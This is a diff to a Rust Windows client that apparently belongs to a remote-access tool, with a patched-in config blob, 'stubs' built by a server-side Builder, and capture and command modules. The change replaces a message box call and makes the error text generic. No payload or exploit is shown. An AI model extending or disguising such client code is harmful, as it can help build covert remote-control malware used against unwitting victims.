@@ -7,6 +7,9 @@
 pub static _CONFIG_DATA: [u8; 4096] = [0xAA; 4096];
 ///////////////////////////////////////////////////////////////////
 
+use std::ffi::OsStr;
+use std::os::windows::ffi::OsStrExt;
+use std::ptr::null_mut;
 use std::sync::Arc;
 
 use aes_gcm::aead::consts::U32;
@@ -22,6 +25,7 @@ use smol::{
     io::{AsyncReadExt, AsyncWriteExt},
     net::TcpStream,
 };
+use winapi::um::winuser::{MessageBoxW, MB_ICONERROR, MB_OKCANCEL};
 
 use crate::commands::computer_info;
 use crate::threading::ActiveCommands;
@@ -30,6 +34,10 @@ mod capture;
 mod commands;
 mod handler;
 mod threading;
+
+pub fn wstring(s: &str) -> Vec<u16> {
+    OsStr::new(s).encode_wide().chain(Some(0)).collect()
+}
 
 /////////////////////////
 fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
@@ -41,8 +49,8 @@ fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
         let length = std::ptr::read_volatile(length_ptr).to_le() as usize;
 
         if length == 0 || length > 4092 {
-            let _ = winsafe::HWND::GetDesktopWindow().MessageBox("Config has not been patched in yet!\nPlease build stubs with the Builder in the Server.", "", winsafe::co::MB::OK | winsafe::co::MB::ICONERROR);
-            return Err("Config has not been patched into client, or is corrupt!".into());
+            MessageBoxW(null_mut(), wstring("Failed to read config!").as_ptr(), wstring("Error").as_ptr(), MB_OKCANCEL | MB_ICONERROR);
+            return Err("Failed to read config!".into());
         }
         //////////////////////////////////////////////////
 
